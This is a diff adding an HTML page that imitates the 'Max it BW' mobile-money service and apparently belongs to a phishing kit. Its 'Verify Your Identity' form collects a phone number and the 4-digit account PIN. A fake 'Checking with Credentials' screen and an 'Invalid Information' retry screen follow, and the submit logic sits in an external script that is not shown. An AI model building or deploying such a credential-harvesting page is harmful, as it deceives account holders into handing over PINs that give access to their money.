@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PIN Verification - Max it BW</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;8 00&display=swap" rel="stylesheet">
+</head>
+<body class="app-page">
+    <div class="app-container">
+        <!-- Header -->
+        <div class="app-header">
+            <div class="logo-small">💰 Max it BW</div>
+            <div class="security-indicator">
+                <span class="lock-icon">🔒</span>
+                <span>PIN Verification</span>
+            </div>
+        </div>
+
+        <!-- Progress Bar -->
+        <div class="progress-wrapper">
+            <div class="progress-steps">
+                <div class="step-item completed">
+                    <div class="step-circle">✓</div>
+                    <span>Personal Details</span>
+                </div>
+                <div class="step-line active"></div>
+                <div class="step-item active">
+                    <div class="step-circle">2</div>
+                    <span>Verification</span>
+                </div>
+                <div class="step-line"></div>
+                <div class="step-item">
+                    <div class="step-circle">3</div>
+                    <span>Approval</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- PIN Entry Screen -->
+        <div id="pinScreen" class="form-card">
+            <h1 class="form-title">Verify Your Identity</h1>
+            <p class="form-subtitle">We need to verify your phone and your Max it BW PIN</p>
+
+            <div class="form-group">
+                <label>Phone Number *</label>
+                <input type="tel" id="phoneNumber" required placeholder="+267XXXXXXXXX" class="large-input">
+                <small class="help-text">Enter your Max it BW phone number</small>
+            </div>
+
+            <div class="form-group">
+                <label>Max it BW PIN (4 Digits) *</label>
+                <input type="password" id="pin" required maxlength="4" placeholder="****" class="large-input pin-input" inputmode="numeric">
+                <small class="help-text">Enter your 4-digit Max it BW PIN</small>
+            </div>
+
+            <button id="verifyPinBtn" class="submit-button">
+                Verify and Continue
+                <span class="arrow">→</span>
+            </button>
+
+            <div class="info-box">
+                <p><strong>Why do we need this?</strong></p>
+                <p>We ensure you are the account owner and prevent unauthorized use of your information.</p>
+            </div>
+        </div>
+
+        <!-- Processing Screen -->
+        <div id="processingScreen" class="form-card" style="display: none;">
+            <div class="processing-content">
+                <div class="spinner-large"></div>
+                <h2 class="processing-title">Verifying Your Information</h2>
+                <p class="processing-text">Please wait while we verify your phone number and PIN...</p>
+                
+                <div class="status-box">
+                    <span class="status-dot"></span>
+                    <span>Checking with Credentials...</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- Rejection Screen -->
+        <div id="rejectionScreen" class="form-card" style="display: none;">
+            <div class="result-content">
+                <div class="result-icon error">✕</div>
+                <h2 class="result-title">Invalid Information</h2>
+                <p class="result-text">Sorry, the information you provided was not accepted. Please try again or contact support.</p>
+                <button class="submit-button" onclick="location.reload()">
+                    Try Again
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <script src="verification-script.js"></script>
+</body>
+</html>
